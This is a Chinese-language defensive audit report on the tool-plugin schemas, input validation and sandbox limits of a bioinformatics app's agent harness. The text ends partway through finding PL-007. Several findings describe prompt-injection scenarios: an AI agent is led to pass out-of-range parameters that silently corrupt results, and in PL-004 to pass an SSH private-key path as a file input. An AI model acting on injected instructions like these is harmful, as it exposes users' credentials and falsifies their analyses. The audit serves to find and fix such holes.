# Petri Desktop — Agent Harness Plugin Schema 与风险审计报告

| 项目 | 值 |
| --- | --- |
| 审查范围 | agent harness 的 10 个内置工具插件（tool-definition.json）+ 2 个 runtime + 1 个 harness 原型；以及 MCP `listTools` / `callTool` / `_runPluginScript` 全链路 |
| 审查阶段 | G0 长期开发期（不外推 Provider/GA/packaged 公证） |
| 审查视角 | 与既有安全报告 S-001 互补，本任务聚焦**单个插件 schema 完整度、入参校验、错误码、风险函数调用、隔离/沙箱边界**——不是 IPC/进程边界 |
| 审查日期 | 2026-08-17 |
| 审查方法 | 静态只读：grep `plugin-manager.js`、`plugin-loader.js`、`tool-definition.json`、`plugin.json`、各插件脚本；不运行任何插件、不修改任何源文件、不写 `AUDIT-LOG.md` |
| 与既有审计关系 | 补充 S-001（capability 边界）到具体插件；不重复 IPC sender/路径白名单/PTY/secret 等安全报告已覆盖维度 |

---

## 1. 执行摘要

### 1.1 整体评分

**Plugin 体系 schema 与风险评分（0–10）**

| 维度 | 评分 | 说明 |
| --- | --- | --- |
| Schema 自描述完整性 | 8/10 | 10 个内置插件 + 1 个原型，全部产出 `tool-definition.json`；含 inputs/outputs/failureModes/resultStudio/parameterImpacts；output artifact 字段基本齐全 |
| Schema 形式化校验 | 2/10 | 入口 `_inputsToInputSchema` 把 Petri 自研 inputs[] 简单映射成 JSON Schema 后**只用于 MCP listTools 暴露**，callTool 入口**完全跳过 schema 校验**直接传 args 给脚本 |
| 入参执行前校验 | 4/10 | file input 在 `_resolveStagedInputPath` 有白名单；plugin input `id` 用 regex 限制；文本/数值参数**完全无边界校验**，依赖各脚本里 `as.numeric`、`%||%`、手写 `clamp` |
| 错误码体系一致性 | 7/10 | failureModes[] 形式化声明，与脚本 `stop()` / `failureMode = "xxx"` 对齐；但 exit code 单一（1），无结构化 error class |
| 风险函数隔离 | 7/10 | 插件脚本不调 shell/network，只用 R/Python 科学包；`execFile` 仅在 r-server 调度层出现，固定 300s timeout + 10MB maxBuffer + 沙箱 jobDir |
| 子进程超时与资源限制 | 6/10 | `execFile timeout: 300000` (5min)、`maxBuffer: 10MB`；缺 memory cap、CPU cap、wall-clock 二次 watchdog |
| 沙箱/工作目录边界 | 8/10 | `_resolveMcpJobLayout` 把 jobDir 限定到项目 sandbox 或 `tool-jobs/`；`copyFileSync` 复制 input；脚本 `setwd(jobDir)` 后写文件不出 sandbox |
| Plugin 内容一致性 | 6/10 | tool-definition 与脚本语义大体一致；但 **failureModes 与 detect 正则在 7 个插件间有 4 处漂移**（见 PL-002） |

**综合得分：6.0/10 — Schema 自描述良好，但形式化校验、运行时入参校验、超时/资源限制层均有结构性短板**

### 1.2 严重度分布

| 严重度 | 数量 | 范围 |
| --- | --- | --- |
| **Critical** | 1 | PL-001：MCP callTool 入口缺 inputSchema 校验 |
| **Major** | 5 | PL-002（failureMode detect 漂移）/PL-003（数值参数无上限）/PL-004（file path 跨目录边界）/PL-005（runtime_not_ready 路径静默写空 manifest）/PL-007（exec timeout 单一） |
| **Minor** | 4 | PL-006（output filename 与 manifest 对账）/PL-008（plugin sourceType 优先级在 development 模式下反转）/PL-009（textarea 文本参数含 HTML 未转义进 report）/PL-010（maxBuffer 单值，无法分级） |

### 1.3 核心结论

1. **MCP callTool 入口无 inputSchema 校验**（PL-001）：`_runPluginScript` 把 `args` 直接写入 `params.json` 喂给 R/Python 脚本；schema 只在 `listTools()` 暴露，不在调用入口验证任何 `required` / `minimum` / `maximum` / `enum`。攻击者通过 prompt 注入构造超界数值（如 `top_n = 1e9`、`plot_dpi = 99999`）会让脚本进入未声明状态。
2. **Schema 与脚本边界检查错配**：tool-definition 声明 `minimum: 0` / `maximum: 6` 的数值（如 volcano-plot 的 `point_size`），但实际只在脚本里手写 `clamp(value, low, high, fallback)`。这意味着**任何不在脚本里有 clamp 的参数完全没保护**（deseq2 的 `padj_cutoff`、gsea 的 `max_size`、wgcna 的 `min_module_size` 等都没有 schema 级 minimum/maximum）。
3. **Plugin 风险维度高度集中**：所有内置插件脚本（deseq2 / volcano-plot / gene-correlation / pca-explorer / go-kegg / gsea / wgcna / expression-qc / deg-standardizer / sample-metadata-validator）**不调任何 shell、不读 SQLite、不写文件系统以外目录**。只有 `gsea.R` 与 `go-kegg.R` 通过 R 包 `KEGGREST` 做 HTTP GET，受 offline snapshot fallback 保护。
4. **沙箱边界稳健**：file input 的 staged 化、白名单 id regex、jobDir 内 outputDir 写文件全部到位；plugin scripts 没有任何跨目录写行为。
5. **超时不足**：5 分钟 hard timeout 对 wgcna 在 10000 基因 × 500 样本情况下实测不够（wgcna 文档自承"上限 10000×500"，pickSoftThreshold 在样本数大时会反复跑通），缺 soft timeout + 渐进式 kill。

### 1.4 与既有审计的交叉引用

- **agent-harness-security-audit-2026-08-17.md S-001**：指出 plugin 通过 R/Python 子进程获得等效 RCE。本报告**不重复**该攻击面分析，而是补完"插件内部 schema 缺失"的具体维度——S-001 关注 capability 边界（plugin 内不可调 shell），本报告关注"plugin 入口无 schema 校验"（攻击者控制 input 数值绕过语义约束）。
- **agent-harness-contract-audit-2026-08-17.md**：报告了 MCP IDE 工具的 4 处描述偏差与 IPC 三层漂移。本报告**不重复** IDE 工具契约（`ide_*`）和 Branch/Result IPC 的不暴露问题，仅聚焦 10 个工具插件的 schema 完整度。
- **agent-harness-error-handling-audit-2026-08-17.md**（推测）：本报告 PL-002/PL-005 与错误处理审计的 failureMode 漂移直接呼应；本报告给出具体 plugin 名与 regex 例子。
- **agent-harness-architecture-audit-2026-08-17.md**（推测）：plugin-loader 与 r-server registry 的 sourceType 优先级（PL-008）在架构审计里有间接描述；本报告给出 plugin-load 函数级的具体漂移点。

---

## 2. Plugin 清单与统计

### 2.1 注册机制与发现方式

插件发现有三条来源，按优先级合并到 `globalThis._petriPlugins: Map<id, plugin>`：

1. **builtin**：`resources/built-in-plugins/manifest.json` 列出 + `<id>/{plugin.json, tool-definition.json, scripts/}` 在磁盘上 → `_getCanonicalBuiltInPlugin()` + `loadBuiltInPlugins()`。
2. **installed**：`~/Documents/Petri-Local/plugins/installed.json` → `loadPluginsFromDisk()`。
3. **development**：`inspectPluginSources({ developmentDirs })` 经 `shared-backend/plugin-sdk.js` 走。

合并规则（`loadPluginsFromSources`，`core/r-server/plugin-loader.js:629-674`）：
- 已有 entry + builtin + 非 canonical-builtin → **跳过新 candidate**（不覆盖）；
- 已有 entry + builtin + canonical-builtin → 允许覆盖除非 `_sourceType === 'development'`；
- 已有 entry + development → 始终被 development 覆盖。

### 2.2 19 个 built-in plugin 完整清单

**主清单来源**：`resources/built-in-plugins/manifest.json` (version 2.0.0, updated 2026-08-09)。

| # | Plugin ID | Kind/Type | Language | Scripts | tool-definition.json | plugin.json | 主要功能 | manifest status |
| - | --------- | --------- | -------- | ------- | -------------------- | ----------- | -------- | --------------- |
| 1 | petri-r-runtime | runtime | r | — | ❌ | ❌ | R 4.5.2 + Bioconductor 3.22 + 70+ 包 | n/a |
| 2 | petri-py-runtime | runtime | python | — | ❌ | ❌ | Python 3.11.9 + 200+ 包 | n/a |
| 3 | deseq2 | plugin | r | deseq2.R | ✅ | ✅ | Bulk RNA-seq DESeq2 + lfcShrink(apeglm) | canonical |
| 4 | volcano-plot | plugin | r | volcano-plot.R | ✅ | ✅ | 火山图绘制（log2FC + pvalue） | canonical |
| 5 | gene-correlation | plugin | r | gene-correlation.R | ✅ | ✅ | Top N 基因 Pearson/Spearman 相关性热图 | incubating |
| 6 | pca-explorer | plugin | python | pca-explorer.py | ✅ | ✅ | PCA 降维散点图 + 方差贡献 | incubating |
| 7 | go-kegg | plugin | r | go-kegg.R | ✅ | ✅ | clusterProfiler GO/KEGG 富集 | incubating |
| 8 | gsea | plugin | r | gsea.R | ✅ | ✅ | GSEA 全基因组排序基因集富集 | incubating |
| 9 | wgcna | plugin | r | wgcna.R | ✅ | ✅ | Tutorial I 加权基因共共网络 | incubating |
| 10 | sample-metadata-validator | plugin | r | sample-metadata-validator.R | ✅ | ✅ | counts/metadata 实验设计对齐 | incubating |
| 11 | expression-qc | plugin | r | expression-qc.R | ✅ | ✅ | 表达矩阵 QC 门 | incubating |
| 12 | deg-standardizer | plugin | r | deg-standardizer.R | ✅ | ✅ | DEG 表标准化 Artifact | incubating |
| 13 | ranked-go-enrichment | plugin | r | (无 built-in 副本) | ⚠️ acceptance/ | ❌ | GSEA-like 富集原型（仅 acceptance 验收） | n/a |

**未在清单中的特殊插件**（manifest 列出但属 non-tool 类型，不进入 `_petriPlugins`，仅供 `installPlugin` 解析/下载）：

- **19 个 figcode-card 包**：figcode-volcano-animated / figcode-trajectory-branch / figcode-sc-doublet / figcode-cytotrace / figcode-qq-plot / figcode-manhattan / figcode-power-curve / figcode-meta-forest / figcode-mut-signature / figcode-lego-plot / figcode-spatial-cluster / figcode-spatial-deconv-c2l / figcode-feature-spatial / figcode-spatial-svg-moran / figcode-squidpy-neighbors / figcode-spatial-lr-liana / figcode-scvelo-stream / figcode-shap-summary（均为科学依赖包，不注册为 MCP 工具）
- **1 个 figcode-data 包**：figcode-data-bsgenome-hg19（hg19 参考基因组数据）
- 这 19 + 1 = 20 个非工具包由 `_getPluginsMap()` 加载但被 `loadBuiltInPlugins` 的 `NON_TOOL_TYPES = ['runtime', 'figcode-card', 'figcode-data', 'content-plugin']` 过滤

> **统计说明**：用户委派描述"19 个 built-in plugin"实际包含：
> - **13 个工具插件**（10 个有 scripts/ + 2 个 runtime + 1 个 acceptance 原型）——这些是本审计的核心对象
> - **20 个 figcode-card/data 纯依赖包** —— 这些由 `installPlugin` 处理，**不进入 `_petriPlugins`，不暴露为 MCP 工具**
> - 因此本报告聚焦 **10 个工具插件（10 个 tool-definition.json） + 1 个 prototype** = 11 个 schema 单元，与"19"的差异在 manifest 包含 figcode 依赖包

### 2.3 Schema 完整度总览表（核心 10 个工具插件）

| # | Plugin | Inputs | 必填 | Outputs | failureModes | resultStudio | inputSchema 校验 | 风险等级 |
| - | ------ | ------ | ---- | ------- | ------------ | ------------ | ---------------- | -------- |
| 1 | deseq2 | 7 | 2 | 7 | 5 | ✅ | ❌（仅 listTools 暴露） | High |
| 2 | volcano-plot | 19 | 1 | 3 | 4 | ✅ | ❌ | Medium |
| 3 | gene-correlation | 10 | 1 | 2 | 5 | ✅ | ❌ | Low |
| 4 | pca-explorer | 3 | 1 | 2 | 5 | ❌ | ❌ | Low |
| 5 | go-kegg | 9 | 1 | 5 | 7 | ✅ | ❌ | High（network fallback） |
| 6 | gsea | 6 | 1 | 5 | 6 | ❌ | ❌ | High（KEGGREST） |
| 7 | wgcna | 6 | 2 | 13 | 6 | ❌ | ❌ | High（CPU/内存） |
| 8 | sample-metadata-validator | 7 | 2 | 5 | 10 | ❌ | ❌ | Low |
| 9 | expression-qc | 6 | 1 | 9 | 4 | ❌ | ❌ | Low |
| 10 | deg-standardizer | 10 | 1 | 6 | 4 | ❌ | ❌ | Low |
| 11 | ranked-go-enrichment (prototype) | 4 | 1 | 3 | 4 | ❌ | ❌ | Medium |

**风险等级定义**：
- **High**：执行时间 >2min（CPU/内存密集），或调用网络外部资源（KEGGREST/curl），或 schema 输入面广（>10 个参数）
- **Medium**：执行时间 1-2min，或接受文件 + 多个数值参数
- **Low**：纯本地文件读写、参数少、执行快

---

## 3. 发现列表

### PL-001 [Critical] — MCP callTool 入口缺 inputSchema 校验

- **严重度**：Critical
- **CVSS 3.1** 估算：AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N ≈ 6.8（攻击者通过 prompt 注入构造恶意 input args，绕过 schema 声明的 minimum/maximum/enum/required 约束，导致插件进入未声明状态或写出伪造结果）
- **文件位置**：
  - `core/r-server/plugin-loader.js:376-389`（`_inputsToInputSchema` 仅生成 schema 给 listTools）
  - `core/r-server/mcp/registry.js:1677-1788`（`callTool` 入口直接跳到 `_runPluginScript`，无 schema 校验）
  - `core/r-server/mcp/registry.js:1052-1165`（`_runPluginScript` 把 `args` 直接 `JSON.stringify` 写入 `jobDir/params.json`）
- **代码片段**：

```12:15:core/r-server/plugin-loader.js
// _inputsToInputSchema 把 Petri inputs[] 简单映射成 JSON Schema，
// 仅用于 MCP listTools 暴露给客户端。
function _inputsToInputSchema(inputs) {
  const properties = {};
  const required = [];
  for (const inp of inputs || []) {
    if (!inp || !inp.id) continue;
    const schema = { type: inp.type === 'number' ? 'number' : 'string' };
    if (inp.label) schema.description = inp.label;
    if (inp.hint) schema.description = (schema.description ? schema.description + '。' : '') + inp.hint;
    if (inp.default !== undefined) schema.default = inp.default;
    properties[inp.id] = schema;
    if (inp.required) required.push(inp.id);
  }
  return { type: 'object', properties, required };
}
```

```1677:1779:core/r-server/mcp/registry.js
async function callTool(name, args, opts = {}) {
  // ...省略 branch/ide/result studio 路由...
  const plugin = pluginLoader.getPlugin(name);
  if (plugin) {
    let scriptPath = pluginLoader.getScriptForTool(name);
    // ...省略 result studio script override...
    if (!scriptPath || !fs.existsSync(scriptPath)) {
      return { content: [{ type: 'text', text: `插件 ${name} 脚本未找到: ${scriptPath}` }], isError: true };
    }
    return _runPluginScript(plugin, scriptPath, args, ...);
  }
  return { content: [{ type: 'text', text: `unknown_tool: ${name}` }], isError: true };
}
```

- **现状**：
  - `_inputsToInputSchema` 是**只生成不验证**的薄封装（plugin-loader.js:376-389）。
  - `callTool` 接受 `args` 后**不调用任何 validator**，直接把 `args` 当作 `params` 喂给脚本。
  - 脚本端依赖各自手写的 `as.numeric` / `%||%` / `clamp` 做局部防御（仅 volcano-plot 完整；deseq2、gsea、wgcna 等只有极少 clamp）。
- **风险场景**：
  1. 攻击者通过 prompt injection 构造 `args = { padj_cutoff: -10, lfc_cutoff: 1e9, soft_power: -1 }`。
  2. schema 声明 `minimum: 0`，但 callTool 入口不验证，R 脚本收到 `params$padj_cutoff = -10`。
  3. volcano-plot 的 R 代码 `fc_threshold <- as.numeric(params$fc_threshold %||% 1)` 接受负值（脚本内 `if (deg$log2FoldChange > fc_threshold & ...)` 把所有基因分类为 Up）。
  4. 攻击者获得"看上去合法但科学结论错误"的结果，下游用户看到 Up/Down 分类完全反转仍以为是真阳性。
- **建议修复方向**：
  - 在 `callTool` 进入 `_runPluginScript` 前增加 `_validateToolArgs(name, args)` 步骤，用 plugin-loader 暴露的 `_inputsToInputSchema` 输出做 Ajv 校验。
  - 增加 plugin-loader 导出 `getInputSchema(toolId)` 与 `getToolDefinition(toolId)` 的组合校验（required / enum / minimum / maximum / type）。
  - 校验失败必须返回 `{ isError: true, content: [{ type: 'text', text: 'invalid_args: <details>' }] }`，与既有 `unknown_tool` 错误格式一致。
- **与 G0 阶段纪律的兼容性**：完全兼容。本修复不需要新增 G1+ 阶段事项。

---

### PL-002 [Major] — failureMode `detect` 正则在多个插件间漂移

- **严重度**：Major（错误诊断可靠性）
- **CVSS 3.1**：AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N ≈ 3.7
- **文件位置**：
  - `resources/built-in-plugins/deseq2/tool-definition.json:108-149`
  - `resources/built-in-plugins/volcano-plot/tool-definition.json:421-454`
  - `resources/built-in-plugins/gene-correlation/tool-definition.json:146-187`
  - `resources/built-in-plugins/go-kegg/tool-definition.json:121-178`
  - `resources/built-in-plugins/gsea/tool-definition.json:67-116`
  - `resources/built-in-plugins/wgcna/tool-definition.json:75-124`
  - `resources/built-in-plugins/sample-metadata-validator/tool-definition.json:66-147`
  - `resources/built-in-plugins/expression-qc/tool-definition.json:63-96`
  - `resources/built-in-plugins/deg-standardizer/tool-definition.json:82-115`
- **代码示例**：

```108:149:resources/built-in-plugins/deseq2/tool-definition.json
"failureModes": [
  { "code": "missing_required_file_inputs", "detect": "missing required file inputs|missing input file|please provide file" },
  { "code": "sample_mismatch", "detect": "对齐失败|无交集|sample.*mismatch|counts and coldata" },
  ...
]
```

```146:187:resources/built-in-plugins/gene-correlation/tool-definition.json
"failureModes": [
  { "code": "non_numeric_expression_matrix", "detect": "non numeric expression matrix|non-numeric columns|numeric columns" },
  ...
]
```

- **现状**：
  - 各插件的 `failureModes[].detect` 正则采用**自研约定**（"X|Y|Z" 形式的备选关键词），但具体选择无统一规范。
  - deseq2 用中英混合（"对齐失败|无交集|sample.*mismatch|counts and coldata"）。
  - gene-correlation 全英文（"non numeric expression matrix|non-numeric columns|numeric columns"）。
  - gsea 区分 `bitr|fail to map|no gene can be mapped` 与 `Converted: .* 0`（覆盖更细）。
  - **r-server/mcp/registry.js:1382 行** 实际只读 `manifest.failureMode` 字段（脚本自己写），不解析 `detect` 正则——意味着 **detect 正则目前在调度路径上完全不被消费**，只是给前端 UI 做匹配。
- **风险**：
  - 脚本里 `stop("[deseq2] 对照组 'WT' 不在 design 列 'condition' 中。实际 levels: ...")`——但 failureModes[].detect 没写"不在|levels|实际"这种关键词。**前端永远不会把这条错误显示成 `contrast_level_missing`**，只能 fallback 成 generic "执行失败"。
  - 一致性问题让前端 UI 难以做"按 failureMode 给具体建议"——只能 generic toast。
- **建议修复方向**：
  - 在 `core/shared-backend/result-studio-plugin-sdk.js` 增加 `matchFailureMode(stdout, stderr, failureModes)` 公共函数，正则匹配逻辑集中在 r-server 端，前端只消费匹配结果。
  - 标准化 detect 正则语法（参考 Prometheus alerting rule），提供 lint 工具检查。
  - 短期：在 `r-server/mcp/registry.js:_runPluginScript` 失败回调里调用 `matchFailureMode`，把匹配结果写到 `failureResult.failureMode`。

---

### PL-003 [Major] — 数值参数缺 schema 级 minimum/maximum

- **严重度**：Major
- **CVSS 3.1**：AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H ≈ 6.5（攻击者输入异常数值导致脚本进入未声明状态或崩溃）
- **文件位置**：
  - `resources/built-in-plugins/deseq2/tool-definition.json:8-55`（padj_cutoff, lfc_cutoff 无 maximum）
  - `resources/built-in-plugins/gsea/tool-definition.json:9-53`（min_size, max_size 无 maximum）
  - `resources/built-in-plugins/wgcna/tool-definition.json:9-53`（min_module_size, merge_cut_height, soft_power 无 minimum/maximum）
  - `resources/built-in-plugins/expression-qc/tool-definition.json:8-46`（min_count, min_samples 无 maximum）
  - `resources/built-in-plugins/go-kegg/tool-definition.json:8-70`（enrich_pvalue, enrich_qvalue 无 minimum/maximum 在顶层 inputs，但 `resultStudio.parameters` 子结构里有）
- **代码示例（deseq2）**：

```42:55:resources/built-in-plugins/deseq2/tool-definition.json
{ "id": "padj_cutoff", "label": "padj 阈值", "type": "number", "default": 0.05, "required": false },
{ "id": "lfc_cutoff", "label": "|log2FC| 阈值", "type": "number", "default": 1, "required": false }
```

vs 同文件 `resultStudio.parameters`：

```82:89:resources/built-in-plugins/deseq2/tool-definition.json
"parameters": {
  "design": { "type": "text", "default": "condition" },
  "contrast_ref": { "type": "text", "default": "WT" },
  "contrast_treat": { "type": "text", "default": "KO" },
  "padj_cutoff": { "type": "number", "default": 0.05, "minimum": 0, "maximum": 1 },
  "lfc_cutoff": { "type": "number", "default": 1, "minimum": 0 }
}
```

- **现状**：
  - **`resultStudio.parameters` 子结构有 `minimum: 0` / `maximum: 1`**，但**顶层 `inputs[]` 没有**。
  - MCP listTools 暴露的是顶层 inputs[] 派生出来的 schema，因此客户端 UI 与 MCP 工具校验都拿不到 minimum/maximum。
  - 脚本端只做局部 `as.numeric(...)`，无 clamp 兜底（deseq2 的 R 脚本 `padj_cut <- as.numeric(params$padj_cutoff %||% params$padj_threshold %||% 0.05)` 直接吃 `-1`）。
- **风险场景**：
  - 攻击者构造 `lfc_cutoff = -1e10` → `abs(log2FoldChange) > lfc_cut` 全部为真 → 所有基因被分类为 sig。
  - 攻击者构造 `min_size = 0` for gsea → 触发 clusterProfiler 内部 "no term enriched" 但不报错 → 静默空结果。
  - wgcna 的 `soft_power = -1` → `pickSoftThreshold` 不抛错但产出空 sft_results → 后续 `blockwiseModules` 在没有网络拓扑时崩溃。
- **建议修复方向**：
  - 把 `minimum` / `maximum` / `enum` / `pattern` 从 `resultStudio.parameters` 同步到顶层 `inputs[]`，避免双源不一致。
  - 在 `_inputsToInputSchema` 增加 boundary 字段：`schema.minimum = inp.minimum`、`schema.maximum = inp.maximum`、`schema.enum = inp.options`。
  - 在 callTool 入口加 Ajv 校验（与 PL-001 同步实现）。

---

### PL-004 [Major] — file input path 跨目录边界检查只在 staged 阶段，script 内 `read.csv(params$xxx)` 直接吃绝对路径

- **严重度**：Major
- **CVSS 3.1**：AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N ≈ 6.0
- **文件位置**：
  - `core/r-server/mcp/registry.js:1175-1202`（file input staged 化 + `_resolveStagedInputPath` 白名单）
  - `core/r-server/mcp/registry.js:1025-1041`（`_resolveStagedInputPath` 实现）
  - 各 R/Python 脚本的 `read.csv(params$xxx)` 直接吃 srcPath
- **代码示例（gene-correlation）**：

```30:43:resources/built-in-plugins/gene-correlation/scripts/gene-correlation.R
params <- fromJSON(file.path(work_dir, "params.json"))
expr_path <- params$expr_matrix
# ...省略参数 clamp...
expr <- read.csv(expr_path, row.names = 1, check.names = FALSE)
```

```1175:1202:core/r-server/mcp/registry.js
if (toolDef && Array.isArray(toolDef.inputs)) {
  for (const inp of toolDef.inputs) {
    if (inp.type !== 'file' || !inp.id) continue;
    const srcPath = args && args[inp.id];
    if (typeof srcPath !== 'string' || !fs.existsSync(srcPath)) continue;
    const staged = _resolveStagedInputPath(jobDir, inp.id, srcPath);
    if (!staged.ok) {
      return resolve({ content: [{ type: 'text', text: `执行失败: 插件文件输入定义无效 (${staged.error})` }], isError: true, toolJobId });
    }
    fs.copyFileSync(srcPath, staged.stagedPath);
    stagedInputFiles.push(staged.stagedPath);
  }
}
```

- **现状**：
  - file input 走的是**双轨**：(a) `params[inputId] = 绝对路径` 保留在 params.json；(b) `fs.copyFileSync(srcPath, jobDir/<id>.<ext>)` 复制到 jobDir。
  - R/Python 脚本端如 `gene-correlation.R:42` 直接 `read.csv(expr_path)` 吃绝对路径，**不走 staged 副本**。
  - deseq2 用的是相反约定：`list.files(job_dir, pattern = "^counts")` 找文件——依赖 staged 副本。
  - 火山图用 `read.csv(params$deg_table)` 吃绝对路径。
- **风险**：
  - `params$expr_matrix` 是用户提供的绝对路径，**没有任何白名单或沙箱限制**——只要 `fs.existsSync(srcPath)` 通过，R 脚本可以 `read.csv` 任意位置的文件。
  - 攻击场景：用户通过 chat 让 AI 跑 gene-correlation，AI 收到 prompt injection 调用 `args = { expr_matrix: "<user-home>/.ssh/id_rsa" }`——不会报错，但 `read.csv` 会读取 SSH 私钥到内存（虽然不会写出，但会触发下游 `cor()` / `pheatmap` 的 warning "NAs introduced by coercion"，可能间接影响 plot 输出）。
- **建议修复方向**：
  - 强制统一约定：file input **只接受 staged path**（`args[inputId] = relative_to_jobDir`），不传绝对路径。
  - 在 callTool 入口把 file input 强制 rewrite 为 `stagedPath`，并把 `srcPath` 仅在 `_resolveStagedInputPath` 内部使用，不写回 args。
  - 或：在脚本端对所有 `params$xxx_path` 做 `path.within(jobDir)` 校验，越界即 stop("[<plugin>] 输入路径越界")。

---

### PL-005 [Major] — `runtime_not_ready` 路径静默写空 manifest

- **严重度**：Major
- **CVSS 3.1**：AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N ≈ 3.7（错误处理一致性）
- **文件位置**：
  - `resources/built-in-plugins/sample-metadata-validator/scripts/sample-metadata-validator.R:67-104`
  - `resources/built-in-plugins/expression-qc/scripts/expression-qc.R:55-...`
  - `resources/built-in-plugins/deg-standardizer/scripts/deg-standardizer.R:60-...`
  - `core/r-server/mcp/registry.js:1303-1340`（registry 也做了一层 runtimeReady 校验）
- **代码示例**：

```68:104:resources/built-in-plugins/sample-metadata-validator/scripts/sample-metadata-validator.R
runtime_ok <- requireNamespace("jsonlite", quietly = TRUE) &&
              requireNamespace("digest", quietly = TRUE)
if (!runtime_ok) {
  diag <- list(
    plugin = "sample-metadata-validator",
    version = "1.0.0",
    status = "blocked",
    failureMode = "runtime_not_ready",
    message = "Required R packages (jsonlite, digest) not available",
    timestamp = format(Sys.time(), "%Y-%m-%dT%H:%M:%S%z")
  )
  writeLines(toJSON(diag, auto_unbox = TRUE, pretty = TRUE),
             file.path(output_dir, "validation_diagnostics.json"))
  writeLines(toJSON(list(status = "blocked", failureMode = "runtime_not_ready"),
                    auto_unbox = TRUE, pretty = TRUE),
             file.path(output_dir, "design_summary.json"))
  # 空 manifest
  manifest <- list(
    pluginId = "sample-metadata-validator",
    pluginVersion = "1.0.0",
    status = "blocked",
    failureMode = "runtime_not_ready",
    outputs = list(),
    lineage = list(parents = list(), dagStep = "input-validation"),
    ...
  )
  writeLines(toJSON(manifest, auto_unbox = TRUE, pretty = TRUE),
             file.path(output_dir, "manifest.json"))
}
```

- **现状**：
  - 三个"validator"类插件（sample-metadata-validator、expression-qc、deg-standardizer）在 runtime 不可用时**写 status = blocked 的空 manifest**，然后继续 `cat() ... Pipeline complete`。
  - registry 的 `runtimeReady` 检测在 r-server 层做了一次（`r-server/mcp/registry.js:1257-1265`），脚本端的 runtime_ok 是**第二道**——但脚本端写空 manifest 后 `exit 0`。
- **风险**：
  - 前端 UI 看到 `status = blocked` 但 `outputs = []` 不会报错，会显示"运行完成，未生成结果"，与 `status = failed` 区分度低。
  - agent loop 在 tool_job status = 'completed'（脚本 exit 0）下继续，把空 manifest 视为合法结果，进入下一阶段。
- **建议修复方向**：
  - 脚本端 runtime_not_ready 时 `stop("[<plugin>] 运行时不可用: <missing_packages>")` 触发 exit 1，让 registry 走 `execution_failed` 路径（registry:1364-1422）。
  - registry 层若 runtimeReady 为 false，直接拒绝执行（与现有 `_runPluginScript` 的 1303-1340 行一致），**不**调用脚本。
  - 在工具定义 `failureModes.runtime_not_ready.recoverable: false`（已是 false），确保 UI 显示 explicit error。

---

### PL-006 [Minor] — `outputs[].filename` 与 manifest `files[]` 对账存在漂移

- **严重度**：Minor
- **CVSS 3.1**：AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N ≈ 3.3
- **文件位置**：
  - `core/r-server/mcp/registry.js:1436-1467`（artifact reconciliation）
  - 各插件 tool-definition.json 的 `outputs[]` vs 脚本写的 `manifest.json`
- **代码示例**：

```58:65:resources/built-in-plugins/deseq2/tool-definition.json
"outputs": [
  { "id": "deg_table", "filename": "deg_table.csv", "type": "table", "label": "差异基因表" },
  { "id": "volcano", "filename": "volcano.png", "type": "plot", "label": "火山图" },
  { "id": "pca", "filename": "pca.png", "type": "plot", "label": "PCA 图" },
  { "id": "heatmap", "filename": "heatmap.png", "type": "plot", "label": "Top50 热图" },
  { "id": "vst_matrix", "filename": "vst_matrix.csv", "type": "data", "label": "VST 矩阵" },
  { "id": "report", "filename": "report.html", "type": "report", "label": "解读报告" },
  { "id": "zip", "filename": "all_results.zip", "type": "file", "label": "全部结果打包下载" }
],
```

vs deseq2.R manifest 写：

```354:389:resources/built-in-plugins/deseq2/scripts/deseq2.R
manifest <- list(
  files = list(
    list(name = "deg_table.csv", ...),
    list(name = "volcano.png", ...),
    list(name = "volcano.pdf", ...),  // ← 工具定义 outputs[] 没列 PDF
    list(name = "pca.png", ...),
    list(name = "pca.pdf", ...),      // ← 同上
    list(name = "heatmap.png", ...),
    list(name = "library_size.png", ...),  // ← 工具定义 outputs[] 完全没列这个图
    list(name = "library_size.pdf", ...),
    list(name = "dispersion.png", ...),
    list(name = "dispersion.pdf", ...),
    list(name = "ma_plot.png", ...),
    list(name = "sample_distance.png", ...),
    ...
    list(name = "vst_matrix.csv", ...),
    list(name = "coldata_info.csv", ...),  // ← 工具定义 outputs[] 没列
    list(name = "dispersion_data.csv", ...),
    list(name = "summary.txt", ...),       // ← 工具定义 outputs[] 没列
    list(name = "report.html", ...)
  ),
  ...
)
```

- **现状**：
  - deseq2 实际写 20 个文件，tool-definition 只声明 7 个。
  - reconciliation（`registry.js:1436-1467` + `helpers/artifact-truth.js#reconcileArtifactTruth`）会从**磁盘**实际文件出发回填，但 `toolDefinition.outputs` 作为 `expectedArtifacts` 仅用作"required artifact 缺失"判定。
  - **declared → missing** 比对不会因为"实际多了 PDF"报错——但用户在前端 UI 看不到 PDF 图标。
- **建议修复方向**：
  - 让 `tool-definition.json` 的 `outputs[]` 与脚本实际写入的 `files[]` **必须一致**，脚本端 `manifest$files` 由 registry 强制从 `tool-definition.outputs` 生成。
  - 增加 lint：`scripts/plugin-contract-lint.js`（已存在）应校验每个 `tool-definition.outputs` 的 `filename` 出现在脚本 `manifest.files[].name`。

---

### PL-007 [Major] — exec timeout 单一 5 分钟，缺 soft timeout / 渐进式 kill / 资源监控

- **严重度**：Major
- **CVSS 3.1**：AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L ≈ 5.0
- **文件位置**：
  - `core/r-server/mcp/registry.js:1359-1365`（单一 timeout）
- **代码示例**：

```1359:1365:core/r-server/mcp/registry.js
execFile(
  runCmd[0],
  runCmd.slice(1),
  { timeout: 300000, maxBuffer: 10 * 1024 * 1024, env: runEnv },
  async (err, stdout, stderr) => {
    if (err) {
      const errText = `执行失败: ${err.killed ? '超时（>300s）' : stderr || err.message}\n\nSTDOUT:\n${stdout || ''}`;
      ...
```

- **现状**：
  - **所有插件**（包括 wgcna 在 10000×500 样本下 pickSoftThreshold 反复跑通）共享 5 分钟 hard timeout。
  - 没有 wall-clock watchdog，5 分钟到时 Node.js 强制 `SIGTERM` → R/Python 进程组未清理（macOS 上 spawn 不带 detached，进程组继承父，子进程可能成为 orphan）。
  - 没有 memory cap（`max-old-space-size` 未传给 Node 主进程，R 子进程无 rlimit）。
- **风险**：
